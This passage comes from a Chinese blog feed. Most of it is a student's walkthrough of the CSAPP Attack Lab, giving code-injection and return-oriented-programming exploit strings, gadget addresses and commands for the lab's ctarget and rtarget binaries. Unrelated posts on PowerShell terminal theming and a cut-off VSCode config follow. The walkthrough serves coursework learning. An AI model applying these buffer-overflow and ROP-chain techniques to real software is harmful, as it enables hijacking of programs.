<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t3.o:     file format elf64-x86-64</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   5:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi</span><br><span class="line">   a:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68 fa 18 40 00 48 8d 7c </span><br><span class="line">24 08 c3 00 00 00 00 00//上面的是机器指令代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00//填充字符</span><br><span class="line">78 dc 61 55 00 00 00 00 //还是跳转到栈顶,需要padding</span><br><span class="line">35 39 62 39 39 37 66 61 //存再test栈帧中的值,0x5561dca0</span><br><span class="line">00 </span><br></pre></td></tr></table></figure>

<p>最后输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;sol3.txt &gt;sol3r.txt &amp;&amp; ./ctarget -q -i sol3r.txt</span><br></pre></td></tr></table></figure>

<p>若看见以下界面,则恭喜通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png" alt="image-20240302020227034"></p>
<h1 id="Part-II-ROP"><a href="#Part-II-ROP" class="headerlink" title="Part II: ROP"></a>Part II: ROP</h1><h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>ROP: Return-Oriented Programming</p>
<p>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭</p>
</blockquote>
<p>得到rtarget的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget&gt;rtarget.s</span><br></pre></td></tr></table></figure>

<p>Part2的限制:</p>
<ol>
<li>恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置</li>
<li>恢复了栈的区域标记,分为可写,可读,可执行.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">堆栈包含一系列小工具地址。每个gadget由一系列指令字节组成，最后一个是0xc3，编码ret指令。当程序从此配置开始执行 ret 指令时，它将启动一系列 gadget 执行，每个 gadget 末尾的 ret 指令导致程序跳转到下一个 gadget 的开头。</span><br><span class="line">小工具可以使用与编译器生成的汇编语言语句相对应的代码，尤其是函数末尾的语句。在实践中，这种形式可能有一些有用的小工具，但不足以实现许多重要的操作。例如，编译函数不太可能将 popq %rdi 作为 ret 之前的最后一条指令。幸运的是，对于面向字节的指令集（例如 x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到小工具。</span><br></pre></td></tr></table></figure>

<p>举一个Gadgets的小例子,这有一个很有意思的小现象</p>
<p>Setval_210’s C &amp;&amp; Assembly Code</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void setval_210(unsigned * p) &#123; </span><br><span class="line">* p = 3347663060U; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7   movl  $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3                  retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi. (See Figure 3A for the encodings of useful movq instructions.) This sequence is followed by byte value c3, which encodes the ret instruction. The function starts at address 0x400f15, and the sequence starts on the fourth byte of the function. Thus, this code contains a gadget, having a starting address of 0x400f18, that will copy the 64-bit value in register %rax to register %rdi.</p>
<p><code>断章取义</code></p>
<p><strong>从0x400f18看到0x400f1b表示的意思则是把%rax的值传到%rdi,即为movq %rax , %rdi</strong></p>
<p>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</p>
<p>Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">您的 RTARGET 代码包含许多与上面所示的 setval_210 函数类似的函数，这些函数位于我们称为小工具场的区域中。您的工作将是识别小工具场中有用的小工具，并使用它们来执行类似于您在第 2 阶段和第 3 阶段中所做的攻击。</span><br><span class="line">重要提示：小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分。不要尝试从程序代码的其他部分构造小工具。</span><br></pre></td></tr></table></figure>

<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>Phase_4要求:</p>
<p>For Phase 4,you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).</p>
<ul>
<li>movq : The codes for these are shown in Figure 3A.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<ul>
<li>popq : The codes for these are shown in Figure 3B.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<ul>
<li><p>ret : This instruction is encoded by the single byte 0xc3.</p>
</li>
<li><p>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p>
</li>
</ul>
<p>Some Advice:</p>
<ul>
<li><p>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</p>
</li>
<li><p>You can do this attack with just two gadgets.</p>
</li>
<li><p>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p>
</li>
</ul>
<p>要求总结:</p>
<ul>
<li><p>复现phase_2的操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>只需要用only 第一到第八个寄存器(%rax —&gt; %rdi)</p>
</li>
<li><p>需要注意0xc3为标志的ret</p>
</li>
<li><p>只需要使用两个gadgets</p>
</li>
</ul>
<p>我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令</p>
<p><strong>一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c -Og farm.c</span><br><span class="line">objdump -d farm.o&gt;farm.s</span><br></pre></td></tr></table></figure>

<p>我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq</p>
<p>操作顺序:</p>
<ul>
<li><p>转移cookie的值转移到%rdi中</p>
</li>
<li><p>把$0x4017ec(touch2地址)压入栈中</p>
</li>
<li><p>ret</p>
</li>
</ul>
<p>这是相关联的函数,需要在其中找到gadgets</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;start_farm&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">   9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000000a &lt;getval_142&gt;:</span><br><span class="line">   a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  13:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000014 &lt;addval_273&gt;:</span><br><span class="line">  14:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  1e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000001f &lt;addval_219&gt;:</span><br><span class="line">  1f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  29:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000002a &lt;setval_237&gt;:</span><br><span class="line">  2a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  34:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000035 &lt;setval_424&gt;:</span><br><span class="line">  35:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000040 &lt;setval_470&gt;:</span><br><span class="line">  40:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000004b &lt;setval_426&gt;:</span><br><span class="line">  4b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  55:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000056 &lt;getval_280&gt;:</span><br><span class="line">  56:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  5f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000060 &lt;mid_farm&gt;:</span><br><span class="line">  60:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  64:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  69:	c3                   	retq  </span><br></pre></td></tr></table></figure>

<p>有意识的搜索%rdi这个寄存器相关的机器指令<code>48 89 c7</code>,搜索和%rax有关的<code>58</code>,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>当273&gt;函数从0x004019a2开始时,会执行<code>mov %rax,%rdi</code>,<code>ret</code></p>
<p>当219&gt;函数从0x004019ab开始时,会执行<code>pop %rax</code>,<code>ret</code>.</p>
<p>这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起</p>
<p>答案框架如下,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---栈底---</span><br><span class="line">0x4017ec    &lt;---touch2地址</span><br><span class="line">0x4019a2    &lt;--gadget2</span><br><span class="line">cookie            #0x59b997fa   &lt;----%rsp</span><br><span class="line"> 0x4019ab     &lt;---gadget1</span><br><span class="line">---栈顶---</span><br></pre></td></tr></table></figure>

<p>编写答案 sol4.txt(注意小端法)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00  00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;sol4.txt &gt;sol4r.txt &amp;&amp; ./rtarget -q -i sol4r.txt</span><br></pre></td></tr></table></figure>

<p>注意是要运行rtarget!!!,不要搞错了兄弟们!!!</p>
<p>若出现以下界面则为成功通关</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png" alt="image-20240302021056405"></p>
<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><blockquote>
<p>坚持就是胜利!</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" />

<p>我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>操作顺序如下:</p>
<ul>
<li>把touch3的地址压入栈中</li>
<li>把cookie的字符串指针地址存入到%rdi寄存器中</li>
</ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0</span><br></pre></td></tr></table></figure>

<p>地址怎么找?</p>
<p>这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址</p>
<p>如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦</p>
<p>下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面”—&gt;”表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br><span class="line">  ----- %rsp--&gt;%rax----0x401a06------------</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">  ----%rax--&gt;%rdi----0x4019a2--------</span><br><span class="line">  这样子就把%rsp的地址丢到%rdi当中了</span><br><span class="line">  执行完getbuf时%rsp= 0x5561dca8</span><br><span class="line">  字符串应该是存在栈顶+相对位置</span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br><span class="line">----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6</span><br><span class="line"></span><br><span class="line">所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手</span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line">  </span><br><span class="line">  ---%ecx---&gt;%esi----0x401a13</span><br><span class="line"> -----</span><br><span class="line">  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行</span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq </span><br><span class="line">-----0x4019ea------</span><br><span class="line"></span><br><span class="line">一步步往前找,每找到一个就看一下能不能通过pop得到该值</span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">---%edx---&gt;%ecx---0x401a69----</span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq  </span><br><span class="line"></span><br><span class="line">  ---%edx---&gt;%eax---0x4019dd---</span><br><span class="line">  </span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">  ----pop %rax---0x4019cc----</span><br><span class="line">  </span><br><span class="line">找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了</span><br><span class="line">就能够定位字符串的位置了</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----栈顶----</span><br><span class="line">buf缓冲区,要填0x28个字符</span><br><span class="line">movq %rsp--&gt;%rax            &lt;----gadget1    0x401a06   &lt;----%rsp</span><br><span class="line">movq %rax---&gt;%rdi           &lt;----gadget2    0x4019a2</span><br><span class="line">pop %rax		           &lt;----gadget3     0x4019cc</span><br><span class="line">相对偏移量  0x48</span><br><span class="line">movl %eax---&gt;%edx          &lt;---gadget4      0x4019dd</span><br><span class="line">movl %edx---&gt;%ecx          &lt;---gadget5      0x401a69</span><br><span class="line">movl %ecx----&gt;%esi	      &lt;---gadget6	0x401a13</span><br><span class="line">lea (%rdi,%rsi,1),%rax	     &lt;---gadget7      0x4019d6</span><br><span class="line">movl %rax---&gt;%rdi            &lt;----gadget8      0x4019a2</span><br><span class="line">$touch3                                &lt;---gadget9        0x004018fa</span><br><span class="line">cookie 			             &lt;---gadget10       35 39 62 39 39 37 66 61</span><br><span class="line">---栈底---</span><br></pre></td></tr></table></figure>



<p>编写sol5.txt文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40  00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p>输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;sol5.txt &gt;sol5r.txt &amp;&amp; ./rtarget -q -i sol5r.txt</span><br></pre></td></tr></table></figure>



<p>提交一手,完美通关!!!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png" alt="image-20240302010809099"></p>
<p>至此,圆满完成通关!</p>
<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.</p>
<p>实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png" alt="image-20240302021849311"></p>
<p>希望下一次能够独立做出lab!这才是更大的进步!</p>
<blockquote>
<p>Good Luck:生命不止,奋斗不息</p>
</blockquote>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>win美化fluent terminal总结</title>
    <url>/EATPOOP/fluent_use/2024/01/18/</url>
    <content><![CDATA[<blockquote>
<p>用命令行安装了无数次oh-my-posh,我无奈大喊holy-shit!</p>
</blockquote>
<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><blockquote>
<p>官方文档：<a href="https://ohmyposh.dev/">https://ohmyposh.dev/</a></p>
</blockquote>
<p>现在的oh-my-posh可以直接从Microsoft Store下载exe文件安装了，别去折腾命令行的命令了，速度太慢了。<br>安装完成后，如果是windows系统，推荐Windows Terminal（没有的话在Microsoft Store里安装）下启动powershell,推荐在商店中下载安装<code>fluent terminal</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205681.png" alt="image-20240225214958894"></p>
<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>配置oh-my-posh过程中比较复杂的点就是Nerd Font和Themes这两点：</p>
<h3 id="1-Nerd-Font"><a href="#1-Nerd-Font" class="headerlink" title="1.Nerd Font"></a>1.Nerd Font</h3><p>去下面的网站下载一个名字里面带NF的字体，windows下直接安装，其他系统参照网站说明。</p>
<blockquote>
<p>下载地址：<a href="https://www.nerdfonts.com/">https://www.nerdfonts.com/</a></p>
</blockquote>
<p>或者<a href="https://link.zhihu.com/?target=https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip">点击下载</a>然后解压全选安装</p>
<h3 id="2-Themes"><a href="#2-Themes" class="headerlink" title="2.Themes"></a>2.Themes</h3><h4 id="step1：设置字体"><a href="#step1：设置字体" class="headerlink" title="step1：设置字体"></a>step1：设置字体</h4><p>用管理员身份打开Fluent Terminal，在界面中按下 ctrl+ shift+，后，会打开一个界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205681.png" alt="image-20240225215041822"></p>
<p>选择终端,更改字体</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205721.png" alt="image-20240225215109949"></p>
<p>记得保存，新开一个窗口,看字体改变.</p>
<h4 id="step2-更改主题"><a href="#step2-更改主题" class="headerlink" title="step2:更改主题"></a>step2:更改主题</h4><h5 id="启动oh-my-posh"><a href="#启动oh-my-posh" class="headerlink" title="启动oh-my-posh"></a>启动oh-my-posh</h5><p>输入如下命令，下面的命令会先检查配置文件存不存在，如果不存在才创建：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="operator">-not</span> (<span class="built_in">Test-Path</span> <span class="variable">$PROFILE</span>)) &#123;</span><br><span class="line">    <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$PROFILE</span> <span class="literal">-Type</span> File <span class="literal">-Force</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，打开配置文件（以下示例展示的是使用记事本进行操作）。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<p>新开一个窗口,看脚本有无运行.</p>
<blockquote>
<p>若出现以下错误:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">无法加载文件C:\Users\xxx\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本</span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<p>win+x（或右键任务栏的Windows图标），选择以管理员身份运行powershell（Windows终端)&#x2F;Fluent Terminal，输入以下命令，重新打开终端即可成功执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span><span class="operator">-</span>ExecutionPolicy <span class="operator">-</span>ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h5><p>输入以下命令查看主题,会看到噼里啪啦一大堆主题样式都会蹦出来，选一个喜欢的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span><span class="operator">-</span>PoshThemes</span><br></pre></td></tr></table></figure>

<p>最后会得到所有主题的路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205758.png" alt="image-20240225215638983"></p>
<p>复制路径,在这里比如我想使用<code>catppuccin</code>的主题,那么我就输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notepad <span class="variable">$profile</span></span><br></pre></td></tr></table></figure>

<p>然后更改命令为如下路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205792.png" alt="image-20240225215821096"></p>
<p>新开一个窗口,观察主题有无发生改变,在这个过程中很可能会出现一些图标不显示，显示一半，或者各种方框乱码，那都是字体的问题，多重启windows Terminal几次，总会成功的。</p>
<h3 id="3-方向键补全-tab"><a href="#3-方向键补全-tab" class="headerlink" title="3.方向键补全+tab"></a>3.方向键补全+tab</h3><p>用管理员身份打开终端输入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Install-Module PSReadLine </span><br></pre></td></tr></table></figure>

<p>若出现如下提示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404212306425.png" alt="image-20240421230608222"></p>
<p>则输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Install-Module PSReadLine -f </span><br></pre></td></tr></table></figure>

<p>依据提示进行安装,安装完后配置文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">notepad $profile</span><br></pre></td></tr></table></figure>

<p>输入以下命令保存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"># Shows navigable menu of all options when hitting Tab</span><br><span class="line">Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete</span><br><span class="line"></span><br><span class="line"># Autocompletion <span class="keyword">for</span> arrow keys</span><br><span class="line">Set-PSReadlineKeyHandler -Key UpArrow -Function HistorySearchBackward</span><br><span class="line">Set-PSReadlineKeyHandler -Key DownArrow -Function HistorySearchForward</span><br><span class="line"></span><br><span class="line"><span class="meta"># auto suggestions</span></span><br><span class="line">Import-Module PSReadLine</span><br><span class="line">Set-PSReadLineOption -PredictionSource History</span><br></pre></td></tr></table></figure>

<p>保存后退出,再开一个窗口输入字母,看有无历史记录.</p>
<h2 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h2><p>少折腾,好看,能用就行</p>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>fluent</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCODE配置总结</title>
    <url>/EATPOOP/vs_environment/2023/12/05/</url>
    <content><![CDATA[<h2 id="WINDOWS下对VSCODE的四个文件配置"><a href="#WINDOWS下对VSCODE的四个文件配置" class="headerlink" title="WINDOWS下对VSCODE的四个文件配置"></a>WINDOWS下对VSCODE的四个文件配置</h2><blockquote>
<p>mingw放在c盘根目录下,安装medium的fira code</p>
</blockquote>
<h3 id="c-cpp-properties-json"><a href="#c-cpp-properties-json" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win32&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;_DEBUG&quot;</span><span class="punctuation">,</span> <span class="string">&quot;UNICODE&quot;</span><span class="punctuation">,</span> <span class="string">&quot;_UNICODE&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;windowsSdkVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.17763.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">          <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c11&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span 